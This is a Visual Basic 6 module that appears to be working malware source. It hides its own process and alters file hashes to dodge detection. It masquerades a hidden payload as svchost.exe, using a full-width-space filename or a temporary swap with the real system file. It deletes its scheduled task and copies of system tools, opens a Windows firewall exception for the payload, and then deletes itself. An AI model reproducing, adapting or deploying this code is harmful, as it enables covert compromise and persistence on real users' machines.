Attribute VB_Name = "Module1"
Option Explicit
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Const MAX_PATH = 260
Private Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OVSERSIONINFOEX) As Long
Private Type OVSERSIONINFOEX
    dwOVSersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
    wServicePackMajor As Integer
    wServicePackMinor As Integer
    wSuiteMask As Integer
    wProductType As Byte
    wReserved As Byte
End Type
Private sysPath As String
Private appFullPath As String
Private tempPath As String
Private tempexe As String

Public Sub Main()
    On Error Resume Next
    App.TaskVisible = False
    Sleep 3000
    Dim bytes() As Byte
    sysPath = SystemDir 'get system32 path
    appFullPath = App.Path & IIf(Len(App.Path) > 3, "\", "") & App.EXEName & ".exe"
    tempPath = TempDir
    tempexe = appFullPath
    
    If LCase(appFullPath) = LCase(sysPath & "\DXcache\dx8vb.exe") Then
        'change md5
        tempexe = tempPath & getTimeString & ".exe"
        Name appFullPath As tempexe
        Open tempexe For Binary As #1
        Open appFullPath For Binary As #2
            ReDim bytes(LOF(1) - 1 - 30)
            Get #1, 1, bytes
            Put #2, 1, bytes
            Put #2, , getTimeString & "000000000000000"
        Close #2
        Close #1
        If Dir(sysPath & "\ntio405.dat", vbHidden + vbSystem) <> "" Then
            Open sysPath & "\ntio405.dat" For Binary As #1
                Put #1, LOF(1) - 29, getTimeString & "000000000000000"
            Close #1
        End If
        'check env
        SetAttr sysPath & "\ntdos405.dat", vbNormal
        Kill sysPath & "\ntdos405.dat"
        If Dir(sysPath & "\ntdos405.dat", vbHidden + vbSystem) <> "" Then
            SetAttr sysPath & "\ntdos405.dat", vbSystem
            killMe 'still running so do nothing
        End If
        'self destroy
        If Dir(sysPath & "\ntio405.dat", vbHidden + vbSystem) = "" Then
            'Shell "cmd.exe /D /C ""attrib.exe """ & sysPath & "\at.com"" -s -h & del """ & sysPath & "\at.com""""", vbHide
            'Shell "cmd.exe /D /C ""attrib.exe """ & sysPath & "\schtasks.com"" -s -h & del """ & sysPath & "\schtasks.com""""", vbHide
            'Shell "cmd.exe /D /C ""attrib.exe """ & sysPath & "\netstat.com"" -s -h & del """ & sysPath & "\netstat.com""""", vbHide
            StartCmdProc
            Sleep 2000
            WriteCMD "attrib.exe """ & sysPath & "\at.com"" -s -h & del """ & sysPath & "\at.com""" & vbNewLine
            WriteCMD "attrib.exe """ & sysPath & "\schtasks.com"" -s -h & del """ & sysPath & "\schtasks.com""" & vbNewLine
            WriteCMD "attrib.exe """ & sysPath & "\netstat.com"" -s -h & del """ & sysPath & "\netstat.com""" & vbNewLine
            If checkTaskEnv = False Then
                'Shell "cmd.exe /D /C ""attrib.exe ""%SystemRoot%\Tasks\At*.job"" -s -h & del ""%SystemRoot%\Tasks\At9999*.job""""", vbHide
                WriteCMD "attrib.exe ""%SystemRoot%\Tasks\At*.job"" -s -h & del ""%SystemRoot%\Tasks\At9999*.job""" & vbNewLine
            Else
                'Shell "schtasks.exe /Delete /F /TN ""DXCache""", vbHide
                WriteCMD "schtasks.exe /Delete /F /TN ""DXCache""" & vbNewLine
            End If
            'Shell "cmd.exe /D /C ""rd /S /Q """ & sysPath & "\DXcache""""", vbHide
            WriteCMD "rd /S /Q """ & sysPath & "\DXcache""" & vbNewLine
            Sleep 5000
            ReadCMD
            CloseCmdShell
            Sleep 2000
            killMe
        End If
        'last check
        'SetAttr sysPath & "\svctemp.exe", vbNormal
        'Kill sysPath & "\svctemp.exe"
        'If Dir(sysPath & "\svctemp.exe", vbHidden + vbSystem) <> "" Then killMe
        Err.Clear
        Open sysPath & "\ntio405.dat" For Binary As #1
        Open sysPath & "\ntdos405.dat" For Binary As #2
            ReDim bytes(LOF(1) - 1 - 30)
            Get #1, 1, bytes
            Put #2, 1, bytes
            Put #2, , getTimeString & "000000000000000"
        Close #2
        Close #1
        If Err Then killMe 'windows 7 maybe
        'magic start!
        'fire1
        'fire2
        fire3
    End If
    killMe
End Sub

Private Sub fire1()
    On Error Resume Next
    Dim magic As String
    magic = "cmd.exe /D /C ""ping -n 3 127.1"
    magic = magic + " & ren """ & sysPath & "\svchost.exe"" svctemp.exe"
    magic = magic + " & ren """ & sysPath & "\ntdos405.sys"" svchost.exe"
    magic = magic + " & start ""svchost"" """ & sysPath & "\svchost.exe"""
    magic = magic + " & ping -n 2 127.1"
    magic = magic + " & ren """ & sysPath & "\svchost.exe"" ntdos405.sys"
    magic = magic + " & ren """ & sysPath & "\svctemp.exe"" svchost.exe"
    magic = magic + " & attrib.exe """ & sysPath & "\ntdos405.sys"" +s"""
    Shell magic, vbHide
End Sub

Private Sub fire2()
    On Error Resume Next
    StartCmdProc
    Sleep 2000
    WriteCMD "ren """ & sysPath & "\svchost.exe"" svctemp.exe" & vbNewLine
    WriteCMD "ren """ & sysPath & "\ntdos405.sys"" svchost.exe" & vbNewLine
    WriteCMD "start ""svchost"" """ & sysPath & "\svchost.exe""" & vbNewLine
    Sleep 2000
    WriteCMD "ren """ & sysPath & "\svchost.exe"" ntdos405.sys" & vbNewLine
    WriteCMD "ren """ & sysPath & "\svctemp.exe"" svchost.exe" & vbNewLine
    WriteCMD "attrib.exe """ & sysPath & "\ntdos405.sys"" +s" & vbNewLine
    Sleep 5000
    ReadCMD
    CloseCmdShell
    Sleep 2000
End Sub

Private Sub fire3()
    On Error Resume Next
    'last check
    SetAttr sysPath & "\svchost.exe　", vbNormal
    Kill sysPath & "\svchost.exe　"
    If Dir(sysPath & "\svchost.exe　", vbHidden + vbSystem) <> "" Then killMe
    StartCmdProc
    Sleep 2000
    WriteCMD "ren """ & sysPath & "\ntdos405.dat"" ""svchost.exe　""" & vbNewLine
    WriteCMD "start ""svchost"" """ & sysPath & "\svchost.exe　""" & vbNewLine
    Sleep 2000
    WriteCMD "ren """ & sysPath & "\svchost.exe　"" ntdos405.dat" & vbNewLine
    WriteCMD "attrib.exe """ & sysPath & "\ntdos405.dat"" +s" & vbNewLine
    WriteCMD "netsh.exe firewall set allowedprogram """ & sysPath & "\svchost.exe　"" svchost enable"
    Sleep 6000
    ReadCMD
    CloseCmdShell
    Sleep 2000
End Sub

Private Sub killMe()
    On Error Resume Next
    Shell "cmd.exe /D /C ""ping -n 3 127.1 & del /F /Q """ & tempexe & """""", vbHide
    End
End Sub

Private Function getTimeString() As String
    On Error Resume Next
    getTimeString = Format(Now, "yyyymmddhhnnss") & (Timer * 10) Mod 10
End Function

Private Function TempDir() As String
    On Error Resume Next
    Dim lpBuffer As String
    lpBuffer = Space(MAX_PATH)
    TempDir = Left(lpBuffer, GetTempPath(MAX_PATH, lpBuffer))
End Function

Private Function SystemDir() As String
    On Error Resume Next
    Dim tmp As String
    tmp = Space(MAX_PATH)
    SystemDir = Left(tmp, GetSystemDirectory(tmp, MAX_PATH))
End Function

Private Function checkTaskEnv() As Boolean
    On Error Resume Next
    checkTaskEnv = False
    Dim OVS As OVSERSIONINFOEX
    OVS.dwOVSersionInfoSize = Len(OVS)
    GetVersionEx OVS
    If OVS.dwPlatformId = 2 And OVS.dwMajorVersion >= 6 Then checkTaskEnv = True
End Function

